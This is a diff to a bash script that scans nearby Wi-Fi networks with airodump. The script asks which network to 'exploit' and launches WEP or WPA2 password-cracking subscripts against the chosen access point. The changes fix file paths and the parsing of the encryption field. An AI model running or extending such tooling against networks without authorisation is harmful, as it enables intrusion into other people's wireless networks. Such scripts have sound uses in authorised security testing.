@@ -17,34 +17,35 @@ x-terminal-emulator -e "sudo /bin/bash -c 'subScripts/airodump1.sh $monInterface
 # Wait 5 seconds so the interface captures a lot of networks
 sleep 5
 # Format CSV
-cat airodumpInfo-01.csv | awk '/^Station MAC/{exit} {print $0}' | tail -n +3 | head -n -3 | sort -r -n -t',' -k11 > temp.csv
+cat csvFiles/airodumpInfo-01.csv | awk '/^Station MAC/{exit} {print $0}' | tail -n +3 | head -n -3 | sort -r -n -t',' -k11 > csvFiles/temp.csv
 
 # Request network to exploit
 echo "Which network do you want to exploit?"
 echo "The networks are ordered by network strength, so if there are duplicates, pick the higher one"
-cat temp.csv | awk -F',' '{num += 1; print num ": " $14;}'
+cat csvFiles/temp.csv | awk -F',' '{num += 1; print num ": " $14;}'
 read num
 
 # Get important information from CSV
-line=$(sed "${num}q;d" temp.csv)
+line=$(sed "${num}q;d" csvFiles/temp.csv)
 bssid=$(echo $line | cut -d ',' -f 1)
 channel=$(echo $line | cut -d ',' -f 4)
-encrypt=$(echo $line | cut -d ',' -f 6)
+encrypt=$(echo $line | cut -d ',' -f 6 | sed 's/^ //g' | cut -d' ' -f 1)
 
 # Start Gathering information from the specified router
 x-terminal-emulator -e "sudo /bin/bash -c 'subScripts/airodump2.sh $monInterface $bssid $channel; exec /bin/bash -i'"
 
 echo "Press Enter to begin password cracking"
 read -s
-
+echo $encrypt
+echo $line
 # Pick exploit that works with encryption method
-if [ $encrypt == "WEP" ]
+if [ $encrypt = "WEP" ]
 then
 	x-terminal-emulator -e "sudo /bin/bash -c 'subScripts/WEPcrack.sh $bssid; exec /bin/bash -i'"
 fi
 if [ $encrypt = "WPA2" ]
 then
-	x-terminal-emulator -e "sudo /bin/bash -c './WPAcrack.sh $bssid; exec /bin/bash -i'"
+	x-terminal-emulator -e "sudo /bin/bash -c 'subScripts/WPAcrack.sh $bssid; exec /bin/bash -i'"
 fi
 echo "Press Enter when done"
 read -s
